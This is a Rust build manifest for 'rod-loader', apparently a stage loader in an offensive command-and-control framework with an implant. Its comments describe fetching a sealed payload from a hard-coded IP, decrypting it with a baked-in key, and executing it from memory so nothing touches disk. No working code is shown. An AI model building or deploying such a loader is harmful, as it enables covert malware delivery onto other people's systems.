[package]
name = "rod-loader"
version = "1.0.0"
edition = "2021"

# The loader (architecture.md Sec 6, the loader tier): the smallest
# delivery artifact the Rust build unit emits. It dials the front's literal
# IPv4 with a token-gated HTTP GET, authenticates the sealed payload under
# the AES-GCM key baked at build time (the R1 wire shape every other
# envelope purpose uses, under the loader payload AAD), writes the opened bytes to a memfd, and
# execs them through the anonymous fd -- the stage never touches the
# filesystem. No libc, no std, no TLS by design: the fetch rides a cleartext
# front (the parser refuses anything else for a loader build), and the seal,
# not the transport, is the confidentiality and integrity boundary. The
# target-side shape is the same documented fexecve pattern the python memfd
# launcher family renders, without the interpreter dependency.
#
# An external component like the implant crate beside it: not part of
# Rod.slnx. The Rust build unit compiles it per loader build request against
# the baked constants in src/baked.rs.

[[bin]]
name = "rod-loader"
path = "src/main.rs"

[dependencies]
# Core-only AES-GCM (the "aes" cipher, no alloc, no getrandom): the loader
# opens the sealed stage in place over a static buffer and generates no
# randomness of its own -- the nonce rides the R1 body.
aes-gcm = { version = "0.10", default-features = false, features = ["aes"] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
